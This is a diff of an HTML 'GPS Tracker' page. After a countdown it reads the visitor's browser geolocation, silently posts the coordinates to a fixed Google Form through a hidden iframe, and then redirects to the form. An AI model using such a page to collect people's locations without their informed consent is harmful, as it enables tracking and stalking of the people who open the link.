@@ -1,8 +1,5 @@
-<!DOCTYPE html>
-<html>
-<head>
 <meta charset="UTF-8">
-<title>GPS Tracker Fixed</title>
+<title>GPS Tracker</title>
 
 <style>
   body {
@@ -37,13 +34,11 @@
 
 <div class="card">
   <h3>GPS Tracker</h3>
-  <p>Capturing location...</p>
+  <p>Submitting your location...</p>
 
   <div id="timer">5</div>
   <p id="status">Starting...</p>
 </div>
-
-<iframe name="hidden_iframe" style="display:none;"></iframe>
 
 <script>
 let t = 5;
@@ -62,7 +57,12 @@ const count = setInterval(() => {
 
 function getLocation() {
 
-  status.innerHTML = "Getting GPS...";
+  if (!navigator.geolocation) {
+    status.innerHTML = "Geolocation not supported";
+    return;
+  }
+
+  status.innerHTML = "Getting location...";
 
   navigator.geolocation.getCurrentPosition(function(pos) {
 
@@ -80,7 +80,7 @@ function getLocation() {
 
     status.innerHTML = "Submitting...";
 
-    // ✔ REAL GOOGLE FORM SUBMIT (NO FETCH)
+    // Create form
     const form = document.createElement("form");
     form.method = "POST";
     form.action = "https://docs.google.com/forms/d/e/1FAIpQLSd4KJoIXicff1vBOAH1VgmFNBFUcGBSxf6iQE08eqOSWAXC_w/formResponse";
@@ -96,7 +96,13 @@ function getLocation() {
 
     form.submit();
 
-    status.innerHTML = "✅ Submitted";
+    status.innerHTML = "Redirecting...";
+
+    // ⬇️ FIXED REDIRECT (important delay)
+    setTimeout(() => {
+      window.location.href =
+        "https://docs.google.com/forms/d/e/1FAIpQLSd4KJoIXicff1vBOAH1VgmFNBFUcGBSxf6iQE08eqOSWAXC_w/viewform";
+    }, 2000);
 
   }, function(err) {
     status.innerHTML = "Error: " + err.message;
@@ -104,5 +110,9 @@ function getLocation() {
 }
 </script>
 
+<!-- hidden iframe -->
+<iframe name="hidden_iframe" style="display:none;"></iframe>
+
 </body>
 </html>
+
